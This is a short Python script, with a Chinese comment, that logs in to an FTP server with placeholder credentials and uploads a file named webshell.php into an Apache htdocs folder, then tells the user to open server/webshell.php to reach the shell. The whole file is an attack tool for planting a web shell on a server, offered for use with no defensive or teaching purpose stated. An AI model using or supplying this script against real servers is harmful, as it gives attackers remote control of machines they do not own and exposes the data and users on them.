from ftplib import FTP 


"""有FTP服务上传webshell更简单,打开url：server/webshell.php进入webshell"""
apache_dir = "APM_Setup/htdocs"
server_name = "server"
server_id = "id"
server_pw = "password"
ftp = FTP(server_name, server_id, server_pw)
ftp.cwd(apache_dir)
fp = open("webshell.php", "rb")
ftp.storbinary("STOR webshell.php", fp)
fp.close()
ftp.quit()
